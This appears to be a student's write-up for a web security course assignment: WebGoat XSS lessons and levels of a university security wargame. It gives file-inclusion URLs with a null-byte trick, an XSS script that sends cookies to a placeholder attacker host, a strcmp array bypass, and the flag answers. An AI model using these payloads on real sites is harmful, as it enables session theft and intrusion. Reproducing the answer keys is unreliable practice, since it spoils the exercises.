# Assignment 4

* Do the following lessons in WebGoat (you do not have to submit any notes regarding these exercises to blackboard):

	* Cross-Site Scripting (XSS) - Stored XSS attacks

		* ![StoredXSS1](img/stored_xss_1.PNG)
		* ![StoredXSS2](img/stored_xss_2.PNG)

	* Cross-Site Scripting (XSS) - Reflected XSS attacks

		* ![ReflectedXSS](img/reflected_xss.PNG)	

* Do the following three exercises on http://websecurity.cs.ru.nl/
	
	* Level 3

		* http://websecurity.cs.ru.nl/?level=3&nieuws=admin/index.php
		* Solution: YTgwZWM1NDg2

	* Level 4
		* http://websecurity.cs.ru.nl/?level=4&nieuws=admin/index.php%00
		* The appended string "%00" represents the nullbyte (\0) and forces php to ignore every appended string behind it
		* See also: http://stackoverflow.com/questions/12731547/can-an-appended-file-suffix-to-a-parameter-for-file-get-contents-be-bypassed
		* Solution: ZjQ5ZmVlOTZm

	* Level 5

		* Use your own host and the cookie stealer script provided on the websec website.
		* In the searchterm field enter: ``` <script>document.location="http://yourhoster.com/stealer.php?cookie="+document.cookie</script>```
		* Click on the search button and use Webscarab to get the resulting url to the search term.
		* Go to the contact site and enter the before mentioned url you created with your malicious code.
		* Solution: NzM2MGUzMWJh

	* Level 6
		

		* Solution: NDY3YjMwZjRl

	* Level 7

		* There is a bug in the strcmp funtion which cannot handle arrays as input and therefore returns 0 which gives you the solution. Inspect the html source and change the name of the input field "pass" to "pass[]".
		* See also: https://www.owasp.org/images/6/6b/PHPMagicTricks-TypeJuggling.pdf
		* Solution: YjU1NWY4MzBi

		






	